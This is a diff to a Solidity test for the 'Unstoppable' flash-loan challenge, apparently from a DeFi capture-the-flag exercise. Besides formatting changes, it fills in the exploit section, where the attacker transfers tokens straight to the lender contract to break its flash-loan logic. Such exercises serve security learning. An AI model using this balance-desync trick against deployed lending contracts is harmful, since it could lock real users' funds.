@@ -23,7 +23,6 @@ contract Unstoppable is Test {
         /**
          * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
          */
-
         utils = new Utilities();
         address payable[] memory users = utils.createUsers(2);
         attacker = users[0];
@@ -47,19 +46,20 @@ contract Unstoppable is Test {
 
         // Show it's possible for someUser to take out a flash loan
         vm.startPrank(someUser);
-        receiverUnstoppable = new ReceiverUnstoppable(
-            address(unstoppableLender)
-        );
+        receiverUnstoppable = new ReceiverUnstoppable(address(unstoppableLender));
         vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
         receiverUnstoppable.executeFlashLoan(10);
         vm.stopPrank();
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitUnstoppable() public {
         /**
          * EXPLOIT START *
          */
+        vm.prank(attacker);
+        dvt.transfer(address(unstoppableLender), 10);
+
         /**
          * EXPLOIT END *
          */
